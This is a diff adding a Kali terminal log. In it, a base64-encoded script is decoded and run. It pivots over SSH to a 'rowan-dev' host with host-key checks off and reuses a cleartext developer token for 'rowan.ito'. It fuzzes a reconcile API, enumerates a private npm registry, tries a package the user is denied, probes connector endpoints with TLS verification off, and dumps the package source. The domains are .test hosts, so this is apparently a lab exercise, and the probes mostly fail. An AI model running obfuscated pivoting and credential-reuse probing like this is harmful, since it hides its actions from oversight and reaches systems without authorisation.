@@ -1,0 +1,182 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k05r2.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCJSRU1PVEUiIDI+JjEKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9IkF1dGhvcml6YXRpb246IEJhc2ljICQocHJpbnRmICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiB8IGJhc2U2NCAtdzApIgpEPSJodHRwczovL2RlbGl2ZXJ5LmtlcGxlcm9wcy50ZXN0Ojg0NDMiCnBvc3QoKXsgY3VybCAtc1MgLW0gMTAgLVggUE9TVCAiJEQvYXBpL3JlY29uY2lsZS90ZW5hbnQtcGFja2FnZSIgLUggIiRBIiAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtLWNhY2VydCAkQ0EgLWQgIiQxIiAtdyAiIFsle2h0dHBfY29kZX1dXG4iOyB9CmVjaG8gIj09PT09IFJFQ09OQ0lMRSB0YXJnZXRlZCA9PT09PSIKd2hpbGUgSUZTPSByZWFkIC1yIGI7IGRvIGVjaG8gIi0tLSAkYiI7IHBvc3QgIiRiIjsgZG9uZSA8PCdCT0RJRVMnCnsiZXhwb3J0X2lkIjoiRVhQLTI4NDEiLCJ0ZW5hbnRfaWQiOiJURU4tQVJXQy0wMTkiLCJwYXJ0aXRpb25faWQiOiJQQVJULUFSV0MtMDEiLCJyZWxlYXNlIjoiRkxLLTcuNC4yIiwic2xvdCI6NiwicmV0YWluZWQiOnRydWV9CnsidGVuYW50X2lkIjoiVEVOLUFSV0MtMDE5In0KeyJ0ZW5hbnQiOiJURU4tQVJXQy0wMTkifQp7InJlY29yZF9pZCI6IkVOVC1BUldDLURJQUctMDY5OCJ9CnsicmVjb3JkIjoiRU5ULUFSV0MtRElBRy0wNjk4In0KeyJzZWxlY3Rpb25fcmVjb3JkIjoiRU5ULUFSV0MtRElBRy0wNjk4In0KeyJjdXN0b21lcl9yZWNvcmQiOiJFTlQtQVJXQy1ESUFHLTA2OTgifQp7ImV4cG9ydF9pZCI6IkVYUC0yODQxIn0KeyJwYXJ0aXRpb25fYmluZGluZyI6IkVYUC0yODQxIn0KeyJiaW5kaW5nIjoiRVhQLTI4NDEifQp7InJlbGVhc2VfaWQiOiJGTEstNy40LjIifQp7InJlbGVhc2UiOiJGTEstNy40LjIifQp7Im1hbmlmZXN0IjoiRkxLLTcuNC4yIn0KeyJwYWNrYWdlIjoiQGtlcGxlcm9wcy9maWVsZGxpbmstY29ubmVjdG9yIn0KeyJkZWNsYXJlZF9yYW5nZSI6Il43LjQuMCJ9Cnsic2VsZWN0ZWRfdmVyc2lvbiI6IjcuNC4yIn0KeyJpbnN0YWxsZWRfdmVyc2lvbiI6IjcuNC4yIn0KeyJ2ZXJzaW9uIjoiNy40LjIifQp7InBhY2thZ2VfdmVyc2lvbiI6IjcuNC4yIn0KeyJzY2hlbWEiOiJmaWVsZGtlc3QucmVjb25jaWxpYXRpb24vdjEiLCJ0ZW5hbnRfaWQiOiJURU4tQVJXQy0wMTkiLCJwYWNrYWdlIjoiQGtlcGxlcm9wcy9maWVsZGxpbmstY29ubmVjdG9yIiwiZXhwb3J0X2lkIjoiRVhQLTI4NDEiLCJwYXJ0aXRpb25faWQiOiJQQVJULUFSV0MtMDEiLCJyZWxlYXNlIjoiRkxLLTcuNC4yIiwic2xvdCI6NiwicmV0YWluZWQiOnRydWUsInNlbGVjdGVkX3ZlcnNpb24iOiI2LjkuOCIsImluc3RhbGxlZF92ZXJzaW9uIjoiNy40LjIiLCJjb25zdW1lciI6ImFyd2MtY29ubmVjdG9yLWNvbnN1bWVyQDE5ZjQzZDIifQpCT0RJRVMKZWNobyAiPT09PT0gUkVHSVNUUlkgRU5VTSA9PT09PSIKcSgpeyBjdXJsIC1zUyAtbSAxNSAtSCAiJEEiIC0tY2FjZXJ0ICRDQSAiJDEiIC13ICJcblsle2h0dHBfY29kZX1dXG4iIHwgaGVhZCAtYyAxNTAwOyBlY2hvOyB9CmVjaG8gIi0tLSBhbGwiOyBxICJodHRwczovL3BhY2thZ2VzLmtlcGxlcm9wcy50ZXN0Ly0vYWxsIgplY2hvICItLS0gc2VhcmNoIGZpZWxkbGluayI7IHEgImh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QvLS92MS9zZWFyY2g/dGV4dD1maWVsZGxpbmsmc2l6ZT01MCIKZWNobyAiLS0tIHNlYXJjaCBjb25zdW1lciI7IHEgImh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QvLS92MS9zZWFyY2g/dGV4dD1jb25zdW1lciZzaXplPTUwIgplY2hvICItLS0gc2VhcmNoIGtlcGxlcm9wcyI7IHEgImh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QvLS92MS9zZWFyY2g/dGV4dD1rZXBsZXJvcHMmc2l6ZT01MCIKZWNobyAiLS0tIHN1cHBvcnQtcmVoZWFyc2FsIHBhY2t1bWVudCB3aXRoIHB1Ymxpc2hlciBhdXRoPyI7IHEgImh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QvQGtlcGxlcm9wcyUyRnN1cHBvcnQtcmVoZWFyc2FsIgplY2hvICI9PT09PSBDT05ORUNUT1IgRU5EUE9JTlRTID09PT09Igpmb3IgbV9wIGluICJHRVQgLyIgIkdFVCAvLndlbGwta25vd24vZmllbGRrZXN0LWNsaWVudCIgIlBPU1QgL2FwaS9maWVsZGxpbmsvcGFja2FnZXMvcG9sbCIgIkdFVCAvYXBpL2ZpZWxkbGluay9wYWNrYWdlcy83LjQuMi9yZWNlaXB0IiAiR0VUIC9hcGkvZmllbGRsaW5rL3BhY2thZ2VzLzYuOS44L3JlY2VpcHQiICJQT1NUIC9hcGkvZmllbGRsaW5rL3BhY2thZ2VzLzcuNC4yL2FjdGl2YXRlIiAiUE9TVCAvYXBpL2ZpZWxkbGluay9wYWNrYWdlcy82LjkuOC9hY3RpdmF0ZSIgIlBPU1QgL2FwaS9maWVsZGxpbmsvcmVoZWFyc2Fscy9yb2xsYmFjayI7IGRvCiAgbT0ke21fcCUlICp9OyBwPSR7bV9wIyogfQogIGVjaG8gIi0tLSAkbSAkcCIKICBjdXJsIC1zUyAtbSAxMCAtayAtWCAiJG0iICJodHRwczovL2Nvbm5lY3Rvci5hcndjLnRlc3QkcCIgLUggIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgLWQgJ3t9JyAtdyAiXG5bJXtodHRwX2NvZGV9XVxuIiB8IGhlYWQgLWMgOTAwOyBlY2hvCmRvbmUKZWNobyAiPT09PT0gTlBNIFBBQ0sgNy40LjIgc2hhID09PT09IgpjZCAvdG1wICYmIHJtIC1yZiBrMDVwICYmIG1rZGlyIGswNXAgJiYgY2QgazA1cApleHBvcnQgTk9ERV9FWFRSQV9DQV9DRVJUUz0kQ0EKbnBtIHBhY2sgQGtlcGxlcm9wcy9maWVsZGxpbmstY29ubmVjdG9yQDcuNC4yID4vZGV2L251bGwgMj4mMSB8fCBucG0gcGFjayBAa2VwbGVyb3BzL2ZpZWxkbGluay1jb25uZWN0b3JANy40LjIgMj4mMSB8IHRhaWwgLTMKbHMgLWw7IHNoYTI1NnN1bSAqLnRneiAyPi9kZXYvbnVsbApmb3IgZiBpbiAqLnRnejsgZG8gdGFyIHh6ZiAiJGYiOyBkb25lIDI+L2Rldi9udWxsCmVjaG8gIi0tLSBwYWNrYWdlIGZpbGVzIjsgZmluZCAuIC1tYXhkZXB0aCAzIC10eXBlIGYgfCBzb3J0CmVjaG8gIi0tLSBpbmRleC5qcyI7IGNhdCBwYWNrYWdlL2luZGV4LmpzIDI+L2Rldi9udWxsCmVjaG8gIi0tLSBsaW1pdHMuanNvbiI7IGNhdCBwYWNrYWdlL2xpbWl0cy5qc29uIDI+L2Rldi9udWxsClJFTU9URQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k05r2.sh; bash /tmp/k05r2.sh; echo DONEMARK_1795208446188$((6*7))
+===== RECONCILE targeted =====
+--- {"export_id":"EXP-2841","tenant_id":"TEN-ARWC-019","partition_id":"PART-ARWC-01","release":"FLK-7.4.2","slot":6,"retained":true}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"tenant_id":"TEN-ARWC-019"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"tenant":"TEN-ARWC-019"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"record_id":"ENT-ARWC-DIAG-0698"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"record":"ENT-ARWC-DIAG-0698"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"selection_record":"ENT-ARWC-DIAG-0698"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"customer_record":"ENT-ARWC-DIAG-0698"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"export_id":"EXP-2841"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"partition_binding":"EXP-2841"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"binding":"EXP-2841"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"release_id":"FLK-7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"release":"FLK-7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"manifest":"FLK-7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"package":"@keplerops/fieldlink-connector"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"declared_range":"^7.4.0"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"selected_version":"7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"installed_version":"7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"version":"7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"package_version":"7.4.2"}
+{"error":"record_binding_mismatch"}
+ [422]
+--- {"schema":"fieldkest.reconciliation/v1","tenant_id":"TEN-ARWC-019","package":"@keplerops/fieldlink-connector","export_id":"EXP-2841","partition_id":"PART-ARWC-01","release":"FLK-7.4.2","slot":6,"retained":true,"selected_version":"6.9.8","installed_version":"7.4.2","consumer":"arwc-connector-consumer@19f43d2"}
+{"error":"record_binding_mismatch"}
+ [422]
+===== REGISTRY ENUM =====
+--- all
+{"_updated":99999,
+"@keplerops/fieldlink-connector":{"name":"@keplerops/fieldlink-connector","description":"FieldLink field-device diagnostic summary connector","dist-tags":{"latest":"7.4.2"},"maintainers":[],"readmeFilename":"README.md","time":{"modified":"2026-11-19T13:49:20.256Z"},"license":"UNLICENSED","versions":{"7.4.2":"latest"}}}
+
+[200]
+
+--- search fieldlink
+{"objects":[{"package":{"name":"@keplerops/fieldlink-connector","description":"FieldLink field-device diagnostic summary connector","dist-tags":{"latest":"7.4.2"},"maintainers":[],"readmeFilename":"README.md","time":{"modified":"2026-11-19T13:49:20.256Z"},"license":"UNLICENSED","versions":{"7.4.2":"latest"}},"flags":{"unstable":true},"local":true,"score":{"final":1,"detail":{"quality":1,"popularity":1,"maintenance":0}},"searchScore":100000}],"total":1,"time":"Fri, 20 Nov 2026 21:00:59 GMT"}
+[200]
+
+--- search consumer
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 21:00:59 GMT"}
+[200]
+
+--- search keplerops
+{"objects":[{"package":{"name":"@keplerops/fieldlink-connector","description":"FieldLink field-device diagnostic summary connector","dist-tags":{"latest":"7.4.2"},"maintainers":[],"readmeFilename":"README.md","time":{"modified":"2026-11-19T13:49:20.256Z"},"license":"UNLICENSED","versions":{"7.4.2":"latest"}},"flags":{"unstable":true},"local":true,"score":{"final":1,"detail":{"quality":1,"popularity":1,"maintenance":0}},"searchScore":100000}],"total":1,"time":"Fri, 20 Nov 2026 21:00:59 GMT"}
+[200]
+
+--- support-rehearsal packument with publisher auth?
+{
+  "error": "user rowan.ito is not allowed to access package @keplerops/support-rehearsal"
+}
+
+[403]
+
+===== CONNECTOR ENDPOINTS =====
+--- GET /
+{"error":"route_not_found"}
+
+[404]
+
+--- GET /.well-known/fieldkest-client
+{"error":"route_not_found"}
+
+[404]
+
+--- POST /api/fieldlink/packages/poll
+{"error":"channel_identity_denied"}
+
+[403]
+
+--- GET /api/fieldlink/packages/7.4.2/receipt
+{"error":"channel_identity_denied"}
+
+[403]
+
+--- GET /api/fieldlink/packages/6.9.8/receipt
+{"error":"channel_identity_denied"}
+
+[403]
+
+--- POST /api/fieldlink/packages/7.4.2/activate
+{"error":"channel_identity_denied"}
+
+[403]
+
+--- POST /api/fieldlink/packages/6.9.8/activate
+{"error":"channel_identity_denied"}
+
+[403]
+
+--- POST /api/fieldlink/rehearsals/rollback
+{"error":"channel_identity_denied"}
+
+[403]
+
+===== NPM PACK 7.4.2 sha =====
+total 4
+-rw-r--r-- 1 rowan rowan 1155 Nov 20 21:01 keplerops-fieldlink-connector-7.4.2.tgz
+4374eaa8d76237949cd373c889fb778b8c67b00c88b51f9a359ef1c3b3ddbb50  keplerops-fieldlink-connector-7.4.2.tgz
+--- package files
+./keplerops-fieldlink-connector-7.4.2.tgz
+./package/README.md
+./package/index.js
+./package/limits.json
+./package/package.json
+--- index.js
+'use strict';
+const limits = require('./limits.json');
+const version = require('./package.json').version;
+
+exports.consume = function consume(request) {
+  if (!request || request.schema !== 'fieldkest.connector/v3') {
+    throw new TypeError('Unsupported connector interface');
+  }
+  if (typeof request.tenant_id !== 'string' || typeof request.asset_id !== 'string') {
+    throw new TypeError('A tenant and asset are required');
+  }
+  const measurements = request.measurements || {};
+  const latency = measurements.callback_latency_ms;
+  const count = measurements.sample_count;
+  if (latency !== undefined && (!Number.isFinite(latency) || latency < 0)) {
+    throw new TypeError('Invalid callback latency');
+  }
+  if (count !== undefined && (!Number.isInteger(count) || count < 0)) {
+    throw new TypeError('Invalid sample count');
+  }
+  const assessment = latency === undefined ? 'awaiting-measurements'
+    : latency > limits.maximum_callback_latency_ms ? 'callback-review-required'
+    : count === undefined || count < limits.minimum_sample_count ? 'additional-samples-required' : 'within-operating-limits';
+  return {
+    schema: 'fieldkest.rehearsal-result/v1', tenant_id: request.tenant_id,
+    asset_id: request.asset_id, connector_version: version, assessment,
+    observations: {callback_latency_ms: latency ?? null, sample_count: count ?? null}
+  };
+};
+--- limits.json
+{
+  "maximum_callback_latency_ms": 250,
+  "minimum_sample_count": 10
+}
